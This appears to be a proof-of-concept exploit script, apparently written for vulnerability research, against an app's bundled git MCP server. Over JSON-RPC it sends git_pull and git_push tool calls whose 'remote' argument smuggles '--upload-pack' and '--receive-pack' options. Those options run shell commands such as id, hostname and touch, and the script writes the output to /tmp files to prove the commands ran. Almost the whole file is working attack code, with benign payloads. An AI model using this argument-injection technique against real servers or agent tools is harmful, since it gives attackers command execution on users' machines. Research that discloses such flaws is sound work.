#!/usr/bin/env python3
"""Conclusive PoC: arbitrary command execution via git_mcp_server argument injection.
Captures command OUTPUT (id, hostname) to files — proving real execution, not a fluke.
"""
import subprocess, json, time, os

BIN = "/Applications/Gemini.app/Contents/Helpers/git_mcp_server"
REPO = "/tmp/rce_test_repo"

proc = subprocess.Popen([BIN], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE, text=True)
_id = [0]

def send(method, params=None, notify=False):
    obj = {"jsonrpc": "2.0", "method": method}
    if not notify:
        _id[0] += 1
        obj["id"] = _id[0]
        if params: obj["params"] = params
    proc.stdin.write(json.dumps(obj) + '\n')
    proc.stdin.flush()

def read_msg(timeout=30):
    start = time.time()
    while time.time() - start < timeout:
        line = proc.stdout.readline()
        if line.strip():
            return json.loads(line)
    return None

send("initialize", {"protocolVersion": "2025-06-18", "capabilities": {},
                    "clientInfo": {"name": "poc", "version": "1.0"}})
read_msg()
send("notifications/initialized", notify=True)

def call_tool(name, args, timeout=40):
    send("tools/call", {"name": name, "arguments": args})
    return read_msg(timeout)

def text_of(resp):
    try:
        return " ".join(p.get("text", "") for p in resp["result"]["content"])[:250]
    except Exception:
        return json.dumps(resp)[:250]

for f in ("/tmp/RCE_PROOF1", "/tmp/RCE_PROOF2"):
    if os.path.exists(f): os.remove(f)

print("=== PROOF 1: git_pull --upload-pack executes 'id' and captures output ===")
resp = call_tool("git_pull", {
    "repo_path": REPO,
    "remote": "--upload-pack=id > /tmp/RCE_PROOF1"
})
print("server resp:", text_of(resp))
if os.path.exists("/tmp/RCE_PROOF1"):
    print("*** EXECUTED. /tmp/RCE_PROOF1 content: ***")
    print(open("/tmp/RCE_PROOF1").read())
else:
    print("marker missing")

print("=== PROOF 2: git_pull with reverse-shell-shaped command (harmless echo) ===")
resp = call_tool("git_pull", {
    "repo_path": REPO,
    "remote": "--upload-pack=sh -c 'echo RCE_$(id -u)@$(hostname) > /tmp/RCE_PROOF2'"
})
print("server resp:", text_of(resp))
if os.path.exists("/tmp/RCE_PROOF2"):
    print("*** EXECUTED. /tmp/RCE_PROOF2 content: ***")
    print(open("/tmp/RCE_PROOF2").read())
else:
    print("marker missing")

print("=== PROOF 3: git_push --receive-pack variant ===")
if os.path.exists("/tmp/RCE_PROOF3"): os.remove("/tmp/RCE_PROOF3")
resp = call_tool("git_push", {
    "repo_path": REPO,
    "remote": "--receive-pack=touch /tmp/RCE_PROOF3",
    "branch": "master"
})
print("server resp:", text_of(resp))
print("RCE_PROOF3 exists:", os.path.exists("/tmp/RCE_PROOF3"))

proc.kill()
